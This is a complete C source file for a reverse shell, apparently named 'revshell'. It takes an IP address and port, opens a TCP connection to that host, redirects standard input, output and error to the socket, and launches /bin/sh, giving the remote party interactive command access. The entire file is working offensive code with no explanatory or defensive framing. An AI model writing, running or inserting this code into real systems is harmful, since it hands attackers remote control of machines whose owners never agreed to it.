#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define SHELL            "/bin/sh"

void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
{
    int sd;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    
    /* socket() */
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd < 0) 
        return;
    
    server = gethostbyname(bd_ip);
    if (server == NULL)
        return;
    
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(bd_port);
    
    /* connect() */
    if (connect(sd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) 
        return;
 
    /* motd */   
    //write(sd, MOTD, strlen(MOTD));
    
    /* connect the socket to process sdout,stdin and stderr */
    dup2(sd, 0); 
    dup2(sd, 1); 
    dup2(sd, 2);
    
    /* running the shell */
    execl(SHELL, SHELL, (char *)0);
    close(sd);
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("Usage: ./revshell IP PORT");
        exit(1);
    }
    start_reverse_shell(argv[1], atoi(argv[2]));
}

